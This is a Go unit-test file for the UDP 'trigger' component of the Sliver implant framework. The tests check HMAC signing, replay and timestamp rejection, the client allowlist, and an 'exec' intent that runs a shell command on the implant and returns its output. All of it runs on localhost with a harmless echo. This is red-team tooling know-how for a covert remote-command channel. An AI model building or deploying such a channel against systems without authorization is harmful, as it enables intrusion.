package triggerwake

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"net"
	"strings"
	"testing"
	"time"

	"github.com/0x90pkt/trigger/pkg/protocol"
)

// We can't easily test the "wake" task dispatch (it calls into the
// real transports package; would require the beacon main loop to be
// running). Instead, we test the validation pipeline via handlePacket
// directly with a fake remote and observe whether replay.markIfNew
// gets called for valid messages.

func TestHandlePacketAcceptsValidWake(t *testing.T) {
	cfg := &Config{
		BindAddr:     "127.0.0.1:0",
		Secret:       []byte("test-secret"),
		MaxClockSkew: 5 * time.Second,
		ReplayWindow: 1 * time.Minute,
	}
	replay := newReplayCache(cfg.ReplayWindow)

	msg := protocol.TriggerMessage{
		Version:   protocol.ProtocolVersion,
		ClientID:  "operator-jc",
		Nonce:     "abcdef0123456789",
		Timestamp: protocol.NowUTC(),
		Intent:    "wake",
	}
	sig, err := protocol.Sign(msg, string(cfg.Secret))
	if err != nil {
		t.Fatalf("Sign: %v", err)
	}
	msg.Signature = sig
	payload, err := protocol.EncodeWire(msg)
	if err != nil {
		t.Fatalf("EncodeWire: %v", err)
	}

	// First call: should accept (nonce is new).
	handlePacket(payload, &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1), Port: 1234}, cfg, replay, nil)
	if !replay.contains(msg.Nonce) {
		t.Fatalf("valid trigger nonce not recorded in replay cache")
	}

	// Second call: same nonce should be replay-rejected (no panic,
	// no double-dispatch — we can't observe dispatch directly but
	// the absence of state change is good).
	handlePacket(payload, &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1), Port: 1234}, cfg, replay, nil)
}

func TestHandlePacketRejectsBadHMAC(t *testing.T) {
	cfg := &Config{
		Secret:       []byte("real-secret"),
		MaxClockSkew: 5 * time.Second,
		ReplayWindow: 1 * time.Minute,
	}
	replay := newReplayCache(cfg.ReplayWindow)

	msg := protocol.TriggerMessage{
		Version:   protocol.ProtocolVersion,
		ClientID:  "x",
		Nonce:     "abcdef0123456789",
		Timestamp: protocol.NowUTC(),
		Intent:    "wake",
	}
	// Sign with WRONG key.
	sig, err := protocol.Sign(msg, "wrong-secret")
	if err != nil {
		t.Fatalf("Sign: %v", err)
	}
	msg.Signature = sig
	payload, _ := protocol.EncodeWire(msg)

	handlePacket(payload, &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1)}, cfg, replay, nil)
	if replay.contains(msg.Nonce) {
		t.Fatalf("bad-HMAC nonce was added to replay cache (validation pipeline skipped a step)")
	}
}

func TestHandlePacketRejectsExpiredTimestamp(t *testing.T) {
	cfg := &Config{
		Secret:       []byte("secret"),
		MaxClockSkew: 1 * time.Second, // tight
		ReplayWindow: 1 * time.Minute,
	}
	replay := newReplayCache(cfg.ReplayWindow)

	msg := protocol.TriggerMessage{
		Version:   protocol.ProtocolVersion,
		ClientID:  "x",
		Nonce:     "abcdef0123456789",
		Timestamp: time.Now().Add(-1 * time.Hour).UTC().Format(time.RFC3339Nano),
		Intent:    "wake",
	}
	sig, _ := protocol.Sign(msg, string(cfg.Secret))
	msg.Signature = sig
	payload, _ := protocol.EncodeWire(msg)

	handlePacket(payload, &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1)}, cfg, replay, nil)
	if replay.contains(msg.Nonce) {
		t.Fatalf("expired-timestamp trigger should have rejected before replay record")
	}
}

func TestHandlePacketHonorsClientIDAllowlist(t *testing.T) {
	cfg := &Config{
		Secret:           []byte("secret"),
		MaxClockSkew:     5 * time.Second,
		ReplayWindow:     1 * time.Minute,
		AllowedClientIDs: []string{"only-this-one"},
	}
	replay := newReplayCache(cfg.ReplayWindow)

	msg := protocol.TriggerMessage{
		Version:   protocol.ProtocolVersion,
		ClientID:  "different-client",
		Nonce:     "abcdef0123456789",
		Timestamp: protocol.NowUTC(),
		Intent:    "wake",
	}
	sig, _ := protocol.Sign(msg, string(cfg.Secret))
	msg.Signature = sig
	payload, _ := protocol.EncodeWire(msg)

	handlePacket(payload, &net.UDPAddr{IP: net.IPv4(127, 0, 0, 1)}, cfg, replay, nil)
	if replay.contains(msg.Nonce) {
		t.Fatalf("disallowed client_id should reject before replay record")
	}
}

func TestStartRejectsBadConfig(t *testing.T) {
	if _, err := Start(nil, Config{}); err == nil {
		t.Fatalf("expected error for empty BindAddr")
	}
	if _, err := Start(nil, Config{BindAddr: "127.0.0.1:0"}); err == nil {
		t.Fatalf("expected error for empty Secret")
	}
}

func TestHandlePacketExecSendsResponse(t *testing.T) {
	secret := "exec-test-secret"
	cfg := &Config{
		BindAddr:     "127.0.0.1:0",
		Secret:       []byte(secret),
		MaxClockSkew: 5 * time.Second,
		ReplayWindow: 1 * time.Minute,
	}
	replay := newReplayCache(cfg.ReplayWindow)

	// Bind a UDP socket to receive the exec response.
	listenAddr, _ := net.ResolveUDPAddr("udp", "127.0.0.1:0")
	conn, err := net.ListenUDP("udp", listenAddr)
	if err != nil {
		t.Fatalf("ListenUDP: %v", err)
	}
	defer conn.Close()

	// The "remote" in handlePacket is where the response goes.
	// Use the conn's local address as the "remote" so the response
	// comes back to us.
	remote := conn.LocalAddr().(*net.UDPAddr)

	// Create a separate conn for the implant-side (handlePacket uses WriteToUDP).
	implantAddr, _ := net.ResolveUDPAddr("udp", "127.0.0.1:0")
	implantConn, err := net.ListenUDP("udp", implantAddr)
	if err != nil {
		t.Fatalf("ListenUDP (implant): %v", err)
	}
	defer implantConn.Close()

	msg := protocol.TriggerMessage{
		Version:   protocol.ProtocolVersion,
		ClientID:  "test-exec-op",
		Nonce:     "fedcba9876543210",
		Timestamp: protocol.NowUTC(),
		Intent:    "exec",
		Payload:   "echo hello-from-exec",
	}
	sig, err := protocol.Sign(msg, secret)
	if err != nil {
		t.Fatalf("Sign: %v", err)
	}
	msg.Signature = sig
	payload, err := protocol.EncodeWire(msg)
	if err != nil {
		t.Fatalf("EncodeWire: %v", err)
	}

	// Dispatch the packet through handlePacket (exec spawns a goroutine).
	handlePacket(payload, remote, cfg, replay, implantConn)

	// Wait for the response on our listener.
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	buf := make([]byte, 16384)
	n, _, err := conn.ReadFromUDP(buf)
	if err != nil {
		t.Fatalf("ReadFromUDP: %v (exec response never arrived)", err)
	}

	resp, err := protocol.DecodeResponse(buf[:n])
	if err != nil {
		t.Fatalf("DecodeResponse: %v", err)
	}

	if resp.RequestNonce != msg.Nonce {
		t.Fatalf("RequestNonce = %q, want %q", resp.RequestNonce, msg.Nonce)
	}
	if resp.ExitCode != 0 {
		t.Fatalf("ExitCode = %d, want 0", resp.ExitCode)
	}
	if !strings.Contains(resp.Output, "hello-from-exec") {
		t.Fatalf("Output = %q, should contain 'hello-from-exec'", resp.Output)
	}

	// Verify response signature.
	valid, err := protocol.VerifyResponse(resp, secret)
	if err != nil {
		t.Fatalf("VerifyResponse: %v", err)
	}
	if !valid {
		t.Fatalf("response HMAC is invalid")
	}
}

// contains exposes the replay cache for test inspection.
func (r *replayCache) contains(nonce string) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	_, ok := r.seen[nonce]
	return ok
}
